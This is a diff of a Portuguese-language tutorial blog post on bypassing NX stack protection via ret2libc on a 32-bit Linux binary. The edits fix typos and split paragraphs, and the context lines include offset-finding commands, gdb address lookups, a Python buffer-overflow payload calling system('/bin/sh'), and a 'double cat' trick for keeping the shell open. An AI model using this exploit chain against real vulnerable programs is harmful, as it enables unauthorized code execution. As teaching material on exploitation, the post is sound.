@@ -34,7 +34,9 @@
       <p>No eXecute, também conhecido como NX é uma das proteções mais comuns encontradas em binários. A ideia é fazer com que a stack não seja executável e assim impedir nossos shellcodes.</p>
       <p>A proteção foi inventada em 2004, em processadores AMD faz uso do bit <strong>No eXecute ( NX )</strong> e em processadores Intel é o <strong>disable bit (XD)</strong>. A proteção impede que o shellcode seja executado quando está na stack.</p>
 
-      <p>O bypass de NX é simples, mas quase nunca vai ser encontrado só, talvez em desafios de CTF. Quando está com outras proteções, acaba não sendo tão fácil, todavia, ainda é possível. Veremos em posts posteriores a esse.<br>Em ambientes 32b, vai ser possível enviar argumentos de uma função para stack e chamar alguma função, faremos uso da função system da libc que se tornou a famosa trick <strong>ret2libc</strong>/<strong>ret2System</strong>.
+      <p>O bypass de NX é simples, mas quase nunca vai ser encontrado sozinho, talvez em desafios de CTF.</p>
+      <p>Quando está com outras proteções, acaba não sendo tão fácil, todavia, ainda é possível. Veremos em posts posteriores a esse.</p>
+      <p> Em ambientes 32b, vai ser possível enviar argumentos de uma função para stack e chamar alguma função, faremos uso da função system da libc que se tornou a famosa trick <strong>ret2libc</strong>/<strong>ret2System</strong>.
 
       <p>LibC é uma biblioteca padrão em ambientes GNU/Linux, ela contêm funções que são indispensáveis para que os programas funcionem. Para checar nosso binário podemos fazer uso do comando <strong>ldd</strong></p>
 
@@ -134,7 +136,7 @@ $ pattern create 700 pat.txt
 $ r < pat.txt
       </pre></code></blockquote>
 
-      <p>podemos observar que tivemos um SIGSEGV e se pegarmos o endereço que está em EIP, vamos saber com quantos bytes exatamente, sobrescrevemos ele.<p>
+      <p>Podemos observar que tivemos um SIGSEGV e se pegarmos o endereço que está em EIP, vamos saber com quantos bytes exatamente, sobrescrevemos ele.<p>
 
       <blockquote><code><pre>
 $ pattern offset 0x4e734138
@@ -149,8 +151,8 @@ ret = "BBBB"
 print buffer + ret
       </pre></code></blockquote>
 
-      <p>para confirmar vamos gerar um arquivo com essa saída e executar novamente nosso programinha...<br>
-      Conirmou nosso EIP com 0x42424242 ? Perfeito, agora vem o bypass da NX.</p>
+      <p>Para confirmar vamos gerar um arquivo com essa saída e executar novamente nosso programinha...<br>
+      Confirmou nosso EIP com 0x42424242 ? Perfeito, agora vem o bypass da NX.</p>
 
       <p>Vamos precisar do endereço da função system da nossa libc, para pegar ela de forma fácil basta digitar <strong>p system</strong> em nosso gdb. Confira se esse endreço está dentro do range da libc com a flag <strong>x</strong></p>
       <blockquote><code><pre>
@@ -186,7 +188,9 @@ Found 11 results, display max 11 items:
 [stack] : 0xffffd817 ("/bin/zsh")
       </pre></code></blockquote>
 
-      <p>Perfeito, vamos usar o endereço <strong>0xf7f5c352</strong>. Entretanto ainda precisamos adicionar um endereço de retorno entre nossa chamada da system e o primeiro argumento, podemos usar qualquer algo como AAAA (0x41414141), mas vamos usar o endereço da função exit que pode ser encontrada com o commando p.</p>
+      <p>Perfeito, vamos usar o endereço <strong>0xf7f5c352</strong>. Entretanto ainda precisamos adicionar um endereço de retorno entre nossa chamada da system e o primeiro argumento, podemos usar algo como AAAA (0x41414141), mas, vamos usar o endereço da função exit que pode ser encontrada com o commando p.</p>
+
+      <p>Nosso exploit vai ficar assim:</p>
 
       <blockquote><code><pre>
 buf = "A" * 516
@@ -197,7 +201,7 @@ arg_one = "\x52\xc3\xf5\xf7"    # "/bin/sh" - 0xf7f5c352
 print buf + ret + retorno + arg_one
       </pre></code></blockquote>
       
-      <p>Se executarmos o programa, o programa vai finalizar logo em seguida, e não vamos conseguir executar comandos, para garantir que vamos ter esse shell aberto, podemos fazer uso da trick <strong>Double Cat</strong></p>
+      <p>Se executarmos o programa, ele vai finalizar logo em seguida, e não vamos conseguir executar comandos, para garantir que vamos ter essa shell aberta, podemos fazer uso da trick <strong>Double Cat</strong></p>
     
      <blockquote><code><pre>
 (cat ./xplfinal; cat) | ./nx
